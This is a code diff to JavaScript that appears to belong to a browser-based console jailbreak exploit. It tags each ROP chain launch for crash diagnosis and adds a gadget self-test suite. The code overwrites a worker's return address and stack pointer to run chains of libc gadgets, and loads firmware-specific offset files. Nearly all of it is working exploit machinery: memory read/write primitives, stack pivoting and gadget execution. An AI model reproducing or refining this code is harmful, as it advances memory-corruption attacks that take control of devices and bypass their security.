@@ -229,7 +229,7 @@ async function prepare(p) {
     const prevCrumbs = crumbsTake();
     if (prevCrumbs) {
         const parts = prevCrumbs.split(">");
-        jbmark("PREV-CRUMBS", "died-after=" + parts.slice(-5).reverse().join(" <= ")
+        jbmark("PREV-CRUMBS", "died-after=" + parts.slice(-7).reverse().join("<")
             + " (" + parts.length + " steps)");
         if (parts.indexOf("nc-ok") !== -1) ps.ncDied = false;
         else if (parts.indexOf("nc") !== -1) ps.ncDied = true;
@@ -853,7 +853,14 @@ async function prepare(p) {
         chain.push(libSceLibcInternalBase.add32(OFFSET_lc_setjmp));
     }
 
+    let launchNo = 0;
     async function launch_chain(chain) {
+        /* prepare() is now getting through, so failures have moved into the
+           stages that follow -- and every launch used to write the same four
+           crumbs, making "died-after=pm" useless once there were twenty of
+           them. Tag each launch with its ordinal and the chain's length: the
+           pair identifies which call died and how big it was. */
+        const tag = "#" + (++launchNo) + "/" + chain.count;
 
         let original_value_of_stack_pointer_ptr = p.read8(stack_pointer_ptr);
         chain.push_write8(original_context, original_return_address);
@@ -1102,11 +1109,11 @@ async function prepare(p) {
                 + ". The worker is now spinning in infloop; reload.");
         }
 
-        crumb("w1");
+        crumb("w1" + tag);
         p.write8(return_address_ptr, gadgets["pop rsp"]);
-        crumb("w2");
+        crumb("w2" + tag);
         p.write8(stack_pointer_ptr, chain.stack_entry_point);
-        crumb("armed");
+        crumb("armed" + tag);
 
         if (window.jb && window.jb.hot)
             jbmark("CHAIN-PRE-POST", "next=worker.postMessage(0)-rop-executes-now");
@@ -1116,15 +1123,15 @@ async function prepare(p) {
            `p1 == 0` branch below was already written for this case but nothing
            could ever reach it -- resolve(0) on timeout so it can. */
         let p1 = await new Promise((resolve) => {
-            const t = setTimeout(() => { crumb("pm-TIMEOUT"); resolve(0); }, 10000);
+            const t = setTimeout(() => { crumb("pm-TIMEOUT" + tag); resolve(0); }, 10000);
             worker.onmessage = function (e) {
                 clearTimeout(t);
                 resolve(1);
             }
-            crumb("pm");
+            crumb("pm" + tag);
             worker.postMessage(0);
         });
-        crumb("wans");
+        crumb("wans" + tag);
         if (window.jb && window.jb.hot)
             jbmark("CHAIN-POST-POST", "worker-answered-p1=" + p1);
         if (p1 == 0) {
@@ -1200,10 +1207,93 @@ async function prepare(p) {
     jbmark("PREP-GETPID-OK", "pid=" + pid.low);
     crumb("OK");
 
+    /* Gadget conformance suite.
+       -----------------------------------------------------------------------
+       prepare() now completes, which changes what is possible: a WORKING chain
+       can execute a gadget and hand the result back to JS, so gadgets no longer
+       have to be inferred from whether the process died. That matters because
+       `mov [rdi], rsi` was silently wrong and cost eight runs to find by
+       bisection -- and it came from the same generator as everything else here,
+       so the rest deserve checking before they are trusted deeper in.
+
+       Each gadget is exercised in its own chain launch, with its own crumb, so
+       one that desyncs and crashes names itself in the trail rather than
+       leaving another anonymous "died-after=pm". Ones that return are checked
+       against the value they should have produced. */
+    if (typeof OFFSET_wk_gadget_selftest !== "undefined" && OFFSET_wk_gadget_selftest) {
+        const out = malloc(0x40);
+        const cell = malloc(0x40);
+        const bad = [];
+        const eq = (v, lo, hi) => v.low === (lo >>> 0) && v.hi === (hi >>> 0);
+
+        const runTest = async (name, build, check) => {
+            crumb("g:" + name);
+            p.write8(out, new int64(0xDEAD0000, 0xDEAD0000));
+            build();
+            chain.write_result(out);
+            await chain.run();
+            const got = p.read8(out);
+            if (!check(got)) bad.push(name + "=0x" + got.toString());
+        };
+
+        try {
+            p.write8(cell, new int64(0xCAFEBABE, 0x00001234));
+            await runTest("mov rax,[rax]", () => {
+                chain.push(gadgets["pop rax"]); chain.push(cell);
+                chain.push(gadgets["mov rax, [rax]"]);
+            }, (v) => eq(v, 0xCAFEBABE, 0x00001234));
+
+            await runTest("add rax,rcx", () => {
+                chain.push(gadgets["pop rax"]); chain.push(new int64(0x1000, 0));
+                chain.push(gadgets["pop rcx"]); chain.push(new int64(0x234, 0));
+                chain.push(gadgets["add rax, rcx"]);
+            }, (v) => eq(v, 0x1234, 0));
+
+            for (const [g, exp] of [["shl rax, 3", 0x800], ["shr rax, 3", 0x20],
+                                    ["shl rax, 4", 0x1000], ["shr rax, 4", 0x10]]) {
+                if (!(g in wk_gadgetmap)) continue;
+                await runTest(g, () => {
+                    chain.push(gadgets["pop rax"]); chain.push(new int64(0x100, 0));
+                    chain.push(gadgets[g]);
+                }, (v) => eq(v, exp, 0));
+            }
+
+            // push_write4 uses `mov [rdi], eax`, a different store from the one
+            // the 8-byte path now takes -- verify it independently.
+            crumb("g:push_write4");
+            p.write8(out, new int64(0, 0));
+            chain.push_write4(out, 0x41424344);
+            await chain.run();
+            const w4 = p.read8(out);
+            if (!eq(w4, 0x41424344, 0)) bad.push("push_write4=0x" + w4.toString());
+
+            crumb("g:push_copy8");
+            p.write8(cell, new int64(0x55667788, 0x00009900));
+            p.write8(out, new int64(0, 0));
+            chain.push_copy8(out, cell);
+            await chain.run();
+            const c8 = p.read8(out);
+            if (!eq(c8, 0x55667788, 0x00009900)) bad.push("push_copy8=0x" + c8.toString());
+
+            crumb("g:done");
+            jbmark("GADGET-SELFTEST", bad.length
+                ? "FAILED " + bad.length + ": " + bad.join("  ")
+                : "all verified by execution (load, add, shifts, write4, copy8)");
+            if (bad.length)
+                throw new Error("gadget self-test: these produced the wrong result"
+                    + " when actually executed -- " + bad.join("  ")
+                    + " -- the addresses in offsets/" + window.fw_str + ".js are"
+                    + " wrong, exactly like mov [rdi],rsi was.");
+        } catch (e) {
+            if (String(e.message || e).indexOf("gadget self-test") === 0) throw e;
+            jbmark("GADGET-SELFTEST", "aborted: " + (e.message || e));
+        }
+    }
+
     return { p: p2, chain: chain };
 }
 let fwScript = document.createElement('script');
 document.body.appendChild(fwScript);
 
 window.__offsetsScript = fwScript;
-fwScript.setAttribute('src', `${SLOPKIT_ROOT}offsets/${window.fw_str}.js?v=32`);
+fwScript.setAttribute('src', `${SLOPKIT_ROOT}offsets/${window.fw_str}.js?v=33`);
